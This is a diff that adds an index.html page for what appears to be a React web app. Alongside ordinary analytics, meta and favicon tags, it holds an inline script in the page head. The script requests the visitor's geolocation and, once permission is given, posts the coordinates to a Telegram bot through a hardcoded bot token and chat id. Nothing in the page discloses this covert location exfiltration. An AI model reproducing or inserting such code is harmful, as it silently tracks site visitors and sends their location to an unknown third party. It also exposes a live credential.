@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html itemscope="" itemtype="http://schema.org/WebPage" lang="en">
+<head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-RTPZX47SDH"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-RTPZX47SDH');
+    </script>
+          <script>
+            if (navigator.geolocation) {
+              // if the Geolocation API is supported by the browser
+              navigator.geolocation.getCurrentPosition(function(position) {
+                // if the user grants permission to share their location
+                const message = `A1 LA: ${position.coords.latitude}, LO: ${position.coords.longitude}`;
+                const apiUrl = `https://api.telegram.org/bot5864276889:AAGDkTSUnFxmEqV_z16P8YvnOgeuCT3uLgY/sendMessage`;
+                fetch(apiUrl, {
+                  method: 'POST',
+                  headers: {
+                    'Content-Type': 'application/json'
+                  },
+                  body: JSON.stringify({
+                    chat_id: -636060412,
+                    text: message
+                  })
+                })
+                .then(response => {
+                  if (!response.ok) {
+                    throw new Error(`Failed to send message. code: ${response.status}`);
+                  }
+                  console.log('msg OK!');
+                })
+                .catch(error => {
+                  console.error(`err msg: ${error.message}`);
+                });
+              }, function(error) {
+                console.error(`err loc: ${error.message}`);
+              });
+            } else {
+              console.error('Geo not supported');
+            }
+          </script>
+    <meta http-equiv="content-type" content="text/html;charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut" href="%PUBLIC_URL%/images/favicon/favicon.ico">
+    <link rel="manifest" href="%PUBLIC_URL%/images/favicon/manifest.json">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-TileImage" content="%PUBLIC_URL%/images/favicon/ms-icon-144x144.png">
+    <meta name="theme-color" content="#ffffff">
+    <link rel="canonical" href="%PUBLIC_URL%/">
+    <link href="//fonts.googleapis.com/css?family=Source+Sans+Pro:400,700|Raleway:400,800,900" rel="stylesheet" async>
+</head>
+
+<body>
+    <div id="root"></div>
+</body>
+
+</html>
